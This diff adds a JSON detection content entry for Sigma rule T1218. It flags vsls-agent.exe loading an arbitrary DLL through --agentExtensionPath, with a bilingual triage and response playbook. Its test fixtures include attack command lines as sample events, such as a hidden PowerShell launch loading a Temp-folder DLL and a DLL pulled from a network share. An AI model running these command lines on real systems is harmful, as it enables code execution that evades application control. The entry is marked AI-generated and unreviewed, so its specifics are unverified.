@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "43103702-5886-11ed-9b6a-0242ac120002",
+    "title": "Suspicious Vsls-Agent Command With AgentExtensionPath Load",
+    "level": "medium",
+    "status": "test",
+    "author": "bohops",
+    "path": "windows/process_creation/proc_creation_win_vslsagent_agentextensionpath_load.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_vslsagent_agentextensionpath_load.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó vsls-agent.exe (agente de Visual Studio Live Share) con el parámetro --agentExtensionPath apuntando a una librería que no es una extensión oficial de Live Share. Puede indicar el uso de un binario firmado de Microsoft para cargar una DLL arbitraria.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\vsls-agent.exe y CommandLine contiene --agentExtensionPath, excepto cuando CommandLine incluye 'Microsoft.VisualStudio.LiveShare.Agent.', que corresponde a las extensiones legítimas.",
+      "why_it_matters": "Un atacante puede usar vsls-agent.exe, firmado por Microsoft, como lolbin para cargar su propia DLL y ejecutar código evadiendo controles de aplicaciones (T1218, ejecución de proxy mediante binarios del sistema).",
+      "triage_steps": [
+        "Revise CommandLine e identifique la ruta exacta de la DLL indicada en --agentExtensionPath; sospeche de rutas en Temp, Downloads, AppData, ProgramData o recursos compartidos de red.",
+        "Confirme que Image esté en una ruta esperada de Visual Studio o de la extensión Live Share de VS Code; una copia en otra carpeta es muy sospechosa.",
+        "Revise ParentImage: Visual Studio (devenv.exe) o VS Code es lo esperado; cmd.exe, powershell.exe, wscript.exe o mshta.exe sugieren abuso.",
+        "Obtenga el hash y la firma de la DLL cargada y consúltelos en su plataforma de threat intelligence; verifique eventos de carga de imágenes (Sysmon ID 7).",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, procesos hijos, conexiones de red salientes y archivos creados por vsls-agent.exe.",
+        "Verifique si el usuario es desarrollador y usa Live Share habitualmente; revise alertas previas del mismo usuario y host."
+      ],
+      "false_positives": [
+        "Uso personalizado de vsls-agent.exe por desarrolladores que prueban extensiones propias de Live Share.",
+        "Pruebas de seguridad o ejercicios de red team autorizados que reproducen esta técnica."
+      ],
+      "response_steps": [
+        "Valide con el usuario o su responsable si la ejecución fue legítima antes de tomar acciones.",
+        "Si se confirma actividad maliciosa, aísle el endpoint desde el EDR y termine el proceso vsls-agent.exe.",
+        "Preserve la DLL y artefactos relacionados para análisis; luego elimínelos y busque persistencia asociada.",
+        "Busque el hash de la DLL y el mismo patrón de CommandLine en el resto de la flota.",
+        "Restablezca credenciales del usuario si hubo ejecución de código y considere restringir vsls-agent.exe donde no se use."
+      ],
+      "severity_rationale": "Nivel medio porque la técnica permite ejecución de código mediante un binario firmado, pero también existe uso legítimo poco común por parte de desarrolladores."
+    },
+    "en": {
+      "summary": "vsls-agent.exe (the Visual Studio Live Share agent) ran with --agentExtensionPath pointing to a library that is not an official Live Share extension. This may be a signed Microsoft binary abused to load an arbitrary DLL.",
+      "what_it_detects": "Process creation events where Image ends with \\vsls-agent.exe and CommandLine contains --agentExtensionPath, unless CommandLine includes 'Microsoft.VisualStudio.LiveShare.Agent.', which marks the legitimate extensions.",
+      "why_it_matters": "An attacker can use the Microsoft-signed vsls-agent.exe as a lolbin to load their own DLL and run code while evading application control (T1218, system binary proxy execution).",
+      "triage_steps": [
+        "Read CommandLine and extract the exact DLL path passed to --agentExtensionPath; treat Temp, Downloads, AppData, ProgramData or network share paths as suspicious.",
+        "Confirm Image sits in an expected Visual Studio or VS Code Live Share extension folder; a copy elsewhere is highly suspicious.",
+        "Check ParentImage: devenv.exe or Code.exe is expected; cmd.exe, powershell.exe, wscript.exe or mshta.exe suggest abuse.",
+        "Hash the loaded DLL, check its signature and threat intel reputation; review image load events (Sysmon ID 7).",
+        "On the same host within +/- 15 minutes, look for child processes, outbound network connections and files written by vsls-agent.exe.",
+        "Confirm whether the user is a developer who uses Live Share; review earlier alerts for the same user and host."
+      ],
+      "false_positives": [
+        "Custom use of vsls-agent.exe by developers testing their own Live Share extensions.",
+        "Authorized penetration tests or red team exercises reproducing this technique."
+      ],
+      "response_steps": [
+        "Confirm with the user or their manager whether the execution was legitimate before acting.",
+        "If malicious, isolate the endpoint through EDR and terminate vsls-agent.exe.",
+        "Preserve the DLL and related artifacts for analysis, then remove them and hunt for related persistence.",
+        "Search the fleet for the DLL hash and the same CommandLine pattern.",
+        "Reset the user's credentials if code ran, and consider blocking vsls-agent.exe where Live Share is not used."
+      ],
+      "severity_rationale": "Medium fits because the technique gives code execution through a signed binary, yet rare legitimate developer use exists."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "vsls-agent.exe launched from PowerShell loading a DLL from the user's Temp folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe",
+          "CommandLine": "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe\" --agentExtensionPath C:\\Users\\jperez\\AppData\\Local\\Temp\\update.dll",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Copied vsls-agent.exe in ProgramData loading a DLL from a network share",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\ProgramData\\cache\\vsls-agent.exe",
+          "CommandLine": "C:\\ProgramData\\cache\\vsls-agent.exe --agentExtensionPath \\\\fileshare.example.com\\public\\helper.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate Live Share launch loading the official Microsoft.VisualStudio.LiveShare.Agent extension (excluded by filter)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe",
+          "CommandLine": "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe\" --autoexit --agentExtensionPath \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Microsoft.VisualStudio.LiveShare.Agent.Windows.dll\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "vsls-agent.exe started without the --agentExtensionPath parameter",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\.vscode\\extensions\\ms-vsliveshare.vsliveshare-1.0.5918\\dotnet_modules\\vsls-agent.exe",
+          "CommandLine": "\"C:\\Users\\jperez\\.vscode\\extensions\\ms-vsliveshare.vsliveshare-1.0.5918\\dotnet_modules\\vsls-agent.exe\" --autoexit --pipe vsls-agent-7f3a",
+          "ParentImage": "C:\\Users\\jperez\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
